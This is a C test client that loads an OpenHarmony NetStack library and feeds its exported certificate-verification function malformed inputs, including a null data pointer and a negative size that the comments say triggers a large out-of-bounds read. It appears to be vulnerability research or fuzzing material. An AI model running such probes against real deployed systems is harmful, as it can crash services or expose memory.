/* Malformed-input client for the OpenHarmony x86_64 CJ NetStack certificate
 * verification exported ABI.
 * ABI source: communication_netstack frameworks/cj/network_security/src/net_network_security_ffi.cpp
 *   CCertBlob { int certType; CArrUI8 certData; }
 * Candidate under test: static_cast<uint32_t>(certData.size) — negative int64_t
 * becomes huge uint32_t, passed to certificate parsing loop for massive OOB read.
 * No target implementation is copied into this client.
 *
 * Case matrix:
 *   0  valid: 4-byte cert data                              control
 *   1  certData.head=NULL, size=1                           null head
 *   2  certData.head=valid, size=-1                         negative → uint32 huge (candidate)
 *   3  certData.head=valid, size=0                          zero (expect safe)
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>

typedef struct { uint8_t *head; int64_t size; } CArrUI8;
typedef struct { int certType; CArrUI8 certData; } CCertBlob;

_Static_assert(sizeof(void *) == 8, "x86_64 caller required");

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc != 2) return 2;
    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }

    int64_t (*verify_cert)(CCertBlob) =
        (int64_t (*)(CCertBlob))dlsym(library,
            "FfiOHOSNetworkSecurityCertVerificationCert");
    if (!verify_cert) { fputs("missing NetStack export\n", stderr); return 4; }

    uint8_t cert_bytes[] = { 0x30, 0x82, 0x01, 0x0A }; /* DER header stub */

    const struct { CCertBlob cert; const char *name; } cases[] = {
        { { 1, { cert_bytes, 4 } },  "valid_control" },
        { { 1, { NULL, 1 } },         "null_head_size1_candidate" },
        { { 1, { cert_bytes, -1 } },  "neg_size_uint32_variant" },
        { { 1, { cert_bytes, 0 } },   "zero_size_control" },
    };

    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
        printf("case=%zu name=%s start head=%p size=%lld\n", k, cases[k].name,
               (void *)cases[k].cert.certData.head,
               (long long)cases[k].cert.certData.size);
        int64_t rc = verify_cert(cases[k].cert);
        printf("case=%zu name=%s done rc=%lld\n", k, cases[k].name, (long long)rc);
    }
    puts("malformed_matrix=completed_no_crash");
    return 0;
}
